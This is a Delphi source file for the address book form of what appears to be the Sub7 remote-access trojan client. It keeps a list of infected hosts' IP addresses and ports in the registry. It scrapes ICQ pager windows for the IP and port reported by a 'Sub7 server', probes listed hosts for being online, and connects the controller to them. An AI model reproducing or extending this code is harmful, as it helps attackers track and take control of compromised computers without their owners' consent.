unit AddressBookUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, ComCtrls, OutlookBtn, TB97Ctls, Registry,
  Menus, Ping, WSocket, ImgList;

type
  TAddressBook = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    ab: TListView;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    Label1: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    ToolbarButton971: TToolbarButton97;
    OutlookBtn1: TOutlookBtn;
    Label2: TLabel;
    OutlookBtn4: TOutlookBtn;
    ts: TMemo;
    PopupMenu1: TPopupMenu;
    connect1: TMenuItem;
    ping1: TMenuItem;
    pingall1: TMenuItem;
    change1: TMenuItem;
    changecomment1: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    changeip1: TMenuItem;
    WSocket1: TWSocket;
    ImageList1: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure ToolbarButton971Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure ToolbarButton971MouseDown(Sender: TObject;
      Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure FormHide(Sender: TObject);
    procedure abDblClick(Sender: TObject);
    procedure connect1Click(Sender: TObject);
    procedure changeip1Click(Sender: TObject);
    procedure change1Click(Sender: TObject);
    procedure changecomment1Click(Sender: TObject);
    procedure ping1Click(Sender: TObject);
    procedure WSocket1DataAvailable(Sender: TObject; Error: Word);
    procedure WSocket1Error(Sender: TObject);
    procedure pingall1Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
    function Allowed(p1, p2: string): boolean;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
  end;

var
  AddressBook: TAddressBook;
  ipPinged:Integer;
  huntit:TWsocket;
implementation

uses Unit1, MainUnit, DispInfoUnit, showmessageunit;
const FirstTime:bool=true;
{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TAddressBook.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TAddressBook.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 ToolbarButton971.Color:=cFormBackground;
 with ab do begin Color:=cFormForeground;Font.Color:=cFormText;end;
 with Edit1 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with Edit2 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 with Edit3 do begin Font.Color:=cFormText;Color:=cFormForeground;end;
 Label1.Font.Color:=cFormText;
 Invalidate; 
end;

procedure TAddressBook.FormCreate(Sender: TObject);
var Keep:WideString;
    sKey:String;
    reg:TRegIniFile;
    Reg2:TRegistry;
    MySerial:String;
    i,j:integer;
begin
 Tag:=16;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
 try huntit:=TWSocket.Create(nil);except end;
 huntit.onDataAvailable:=WSocket1.OnDataAvailable;
 huntit.onError:=WSocket1.OnError;
 huntit.proto:='tcp';
 SetTheColors;
 ts.lines.clear;
 ab.items.clear;
 Reg2:=TRegistry.Create;
 with Reg2 do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(RegDir,false) then
   try
    ts.text:=ReadString('address_book');
   except
   end;
   Free;
  end;
   j:=0;
 for i:=0 to round(ts.lines.Count div 4)-1 do
  begin
   with ab.Items.add do
    begin
     Caption:=ts.lines[(j*4)];
     SubItems.Add(ts.lines[1+(j*4)]);
     SubItems.Add(ts.lines[2+(j*4)]);
     SubItems.Add('n/a');
     j:=j+1;
    end;
  end;
 Keep:='';
 for i:=0 to ab.Items.Count-1 do
  begin
   Keep:=Keep+ab.Items[i].Caption+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[0]+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[1]+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[2]+#13#10;
  end;
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.WriteString(RegDir+#0,'address_book',Keep);
 reg.Free;
end;

procedure TAddressBook.CloseButtonClick(Sender: TObject);
begin
 Hide;
end;

procedure TAddressBook.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TAddressBook.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TAddressBook.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

// -------------------------------------------- Get info from www pager ----------------------
var MessageData:WideString;
    no:integer;
function WinText (hWnd : LongInt) : string;
var PC : PChar;
    L : integer;
begin
 L:=SendMessage (hWnd, WM_GETTEXTLENGTH, 0, 0);
 try getmem (PC, L+1);except end;
 SendMessage (hWnd, WM_GETTEXT, L+1, LongInt (PC));
 result:=PC;
end;

function FindSiteWindowWWP(Handle: Hwnd; Info: Pointer): Bool; stdcall;
begin
  Result := True;
  inc(no);
  MessageData:=MessageData+inttostr(no)+':'+wintext(handle)+#13#10;
  {if no=25 then MessageData:=wintext(Handle);}
end;

procedure TAddressBook.ToolbarButton971Click(Sender: TObject);
var i:longint;
    wtext:string;
    found:boolean;
    wwp_ip,wwp_port:string;
    from,size:integer;
begin
 Found:=False;
 for i:=1 to 16384 do if (IsWindow (i)) and (IsWindowVisible(i))  then begin
  try wtext:=wintext(i);except end;
  if (copy(wtext,1,26)='Incoming WWPager Message [') then
  begin
   no:=0;
   MessageData:='';
   try EnumChildWindows(i,@FindSiteWindowWWP,0);Found:=True;except mainform.showmsg('error');end;
  end;
 end;
 if not found then begin mainform.ShowMsg('www pager not found. right click on the wwp pager icon in the address book for help.');exit;end;

 from:=Pos('Sender IP: ',MessageData)+11;
 size:=Pos('Subject:',MessageData)-2-from;
 wwp_ip:=copy(MessageData,from,size);

 from:=Pos('port=',MessageData)+5;
 size:=Pos('ip=',MessageData)-from-3;
 wwp_port:=copy(MessageData,from,size);

 if Copy(MessageData,Pos('Subject: ',MessageData)+9,16)='UserIsOnline^^^^' then
  begin
   from:=Pos('port=',MessageData)+5;
   wwp_port:=copy(MessageData,from,length(MessageData)-2);
   wwp_port:=copy(wwp_port,1,length(wwp_port)-2);
  end;
 if Sender=MainForm then
  begin
   MainForm.IPEdit.Text:=wwp_ip;
   MainForm.PortEdit.Text:=wwp_port;
   exit;
  end;
  Edit1.Text:=wwp_ip;
  Edit2.Text:=wwp_port;
  Edit3.Text:='icq pager';
end;
// -------------------------------------------- Get info from www pager ----------------------

procedure TAddressBook.OutlookBtn4Click(Sender: TObject);
begin
 if ((Edit1.Text='') or (Edit2.Text='')) then begin MainForm.ShowMsg('you must specify an ip address and a port number');exit;end;
 MainForm.IPEdit.Text:=Edit1.Text;
 MainForm.PortEdit.Text:=Edit2.Text;
 Hide;
 if (MainForm.Connected) then MainForm.ConnectButtonClick(self);
 MainForm.ConnectButtonClick(self);
end;

function TAddressBook.Allowed(p1,p2:string):boolean;
var i:integer;
begin
result:=true; if ab.Items.Count=0 then Exit;
for i:=0 to ab.Items.Count-1 do
 if (p1=ab.Items[i].Caption) and (p2=ab.Items[i].SubItems[0]) then begin result:=false;break;end;
end;

procedure TAddressBook.OutlookBtn3Click(Sender: TObject);
begin
 if ((Edit1.Text='') or (Edit2.Text='')) then begin MainForm.ShowMsg('you must specify an ip address and a port number');exit;end;
 if Not Allowed(Edit1.Text,Edit2.Text) then MainForm.ShowMsg(Edit1.Text+':'+Edit2.Text+' already exists in your address book.') else
 with ab.items.add do
  begin
   caption:=edit1.text;
   SubItems.Add(Edit2.Text);
   if Edit3.Text='' then SubItems.Add('<none>') else SubItems.Add(Edit3.Text);
   SubItems.Add('n/a');
  end; 
end;

procedure TAddressBook.ToolbarButton971MouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
var inf:TDispInfo;
begin
 if Button=mbRight then
  begin
   try inf:=TDispInfo.Create(Application);except end;
   inf.OutLookBtn1.Visible:=False;
   inf.OutLookBtn2.Visible:=False;
   inf.memo.ScrollBars:=ssNone;
   inf.memo.height:=inf.memo.height+30;
   inf.Memo.Lines.Clear;
   inf.memo.lines.add('');
   inf.memo.lines.add('');
   inf.memo.lines.text:=inf.memo.lines.text+('when you receive an ICQ www pager from a Sub7 server, if you want to connect to it, just keep the www pager window open, and click this button. the ip and port will be filled with the info from the pager,');
   inf.memo.lines.text:=inf.memo.lines.text+' you don''t have to copy it from the pager anymore.';
   inf.memo.lines.add('');
   inf.memo.lines.add('');
   inf.CaptionLabel.Caption:='icq www pager retriever';
   inf.Caption:='icq www pager retriever';
   inf.ShowModal;
   inf.free;
  end;
end;

procedure TAddressBook.OutlookBtn1Click(Sender: TObject);
begin
 hide;
end;

procedure TAddressBook.FormShow(Sender: TObject);
var Reg:TRegistry;
    MySerial:String;
    i,j:integer;
begin
if not FirstTime then exit;
FirstTime:=False;
 ts.lines.clear;
 ab.items.clear;
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(RegDir,false) then
   try
    ts.text:=ReadString('address_book');
   except
   end;
   Free;
  end;
   j:=0;
 for i:=0 to round(ts.lines.Count div 4)-1 do
  begin
   with ab.Items.add do
    begin
     Caption:=ts.lines[(j*4)];
     SubItems.Add(ts.lines[1+(j*4)]);
     SubItems.Add(ts.lines[2+(j*4)]);
     SubItems.Add(ts.lines[3+(j*4)]);
     j:=j+1;
    end;
  end;
 Edit1.Text:=MainForm.IPEdit.Text;
 Edit2.Text:=MainForm.PortEdit.Text;
end;

procedure TAddressBook.OutlookBtn2Click(Sender: TObject);
begin
 if ab.Selected<>nil then ab.Selected.Delete;
end;

procedure TAddressBook.FormHide(Sender: TObject);
var Keep:WideString;
    i:integer;
    sKey:String;
    reg:TRegIniFile;
begin
 Keep:='';
 for i:=0 to ab.Items.Count-1 do
  begin
   Keep:=Keep+ab.Items[i].Caption+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[0]+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[1]+#13#10;
   Keep:=Keep+ab.Items[i].SubItems[2]+#13#10;
  end;
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.WriteString(RegDir+#0,'address_book',Keep);
 reg.Free;
end;

procedure TAddressBook.abDblClick(Sender: TObject);
begin
 if ab.Selected=nil then Exit;
 Edit1.Text:=ab.Selected.Caption;
 Edit2.Text:=ab.Selected.SubItems[0];
 if ((Edit1.Text='') or (Edit2.Text='')) then begin MainForm.ShowMsg('you must specify an ip address and a port number');exit;end;
 MainForm.IPEdit.Text:=Edit1.Text;
 MainForm.PortEdit.Text:=Edit2.Text;
 Hide;
 if (MainForm.Connected) then MainForm.ConnectButtonClick(self);
 MainForm.ConnectButtonClick(self);
end;

procedure TAddressBook.connect1Click(Sender: TObject);
begin
 abDblClick(self);
end;

procedure TAddressBook.changeip1Click(Sender: TObject);
var res:string;
begin
 if ab.Selected=nil then exit;
 GetTextForm.GetText('change ip', 'new ip: ',ab.Selected.Caption,false, res);
 if res<>'' then ab.Selected.Caption:=res;
end;

procedure TAddressBook.change1Click(Sender: TObject);
var res:string;
begin
 if ab.Selected=nil then exit;
 GetTextForm.GetText('change port', 'new port: ',ab.Selected.SubItems[0],false, res);
 if res<>'' then ab.Selected.SubItems[0]:=res;
end;

procedure TAddressBook.changecomment1Click(Sender: TObject);
var res:string;
begin
 if ab.Selected=nil then exit;
 GetTextForm.GetText('change comment', 'new comment: ',ab.Selected.SubItems[1],false, res);
 if res<>'' then ab.Selected.SubItems[1]:=res;
end;

procedure TAddressBook.ping1Click(Sender: TObject);
begin
 if ab.Selected=nil then exit;
 ipPinged:=ab.Selected.Index;
 ab.Items[ipPinged].SubItems[2]:='wait...';
 huntit.port:=ab.Selected.SubItems[0];
 if Pos('.',ab.Selected.Caption)=0 then
  huntit.addr:=MainForm.GetUINIP(ab.Selected.Caption)
  else huntit.addr:=ab.Selected.Caption;
 huntit.connect;
 if ipPinged<>0 then MainForm.WaitFor(6*1000);
 if IPPinged<>0 then
  begin
   ab.Items[ipPinged].SubItems[2]:='offline';
   IPPinged:=0;
   huntit.close;
  end;
end;

procedure TAddressBook.WSocket1DataAvailable(Sender: TObject; Error: Word);
var len:integer;
    Buf : array [0..127] of char;
begin
// Len := TCustomLineWSocket(Sender).Receive(@Buf, Sizeof(Buf) - 1);
// if Len<0 then
//  ab.Items[ipPinged].SubItems[2]:='offline'
{ else }
 ab.Items[ipPinged].SubItems[2]:='online';
 ab.Items[ipPinged].ImageIndex:=1;
 ipPinged:=0;
 huntit.close;
end;

procedure TAddressBook.WSocket1Error(Sender: TObject);
begin
 ab.Items[ipPinged].SubItems[2]:='offline';
 ab.Items[ipPinged].ImageIndex:=2;
 ipPinged:=0;
 huntit.close;
end;

procedure TAddressBook.pingall1Click(Sender: TObject);
var i:integer;
begin
 for i:=0 to ab.Items.Count do
  begin
   ipPinged:=i;
   ab.Items[ipPinged].SubItems[2]:='wait...';
   huntit.port:=ab.Items[i].SubItems[0];
 if Pos('.',ab.Items[i].Caption)=0 then
  huntit.addr:=MainForm.GetUINIP(ab.Items[i].Caption)
  else huntit.addr:=ab.Items[i].Caption;
   huntit.connect;
   if ipPinged<>0 then MainForm.WaitFor(4*1000);
   if IPPinged<>0 then
   begin
    ab.Items[ipPinged].SubItems[2]:='offline';
    ab.Items[ipPinged].ImageIndex:=2;
    IPPinged:=0;
    huntit.close;
   end;
  end;
end;

procedure TAddressBook.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TAddressBook.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
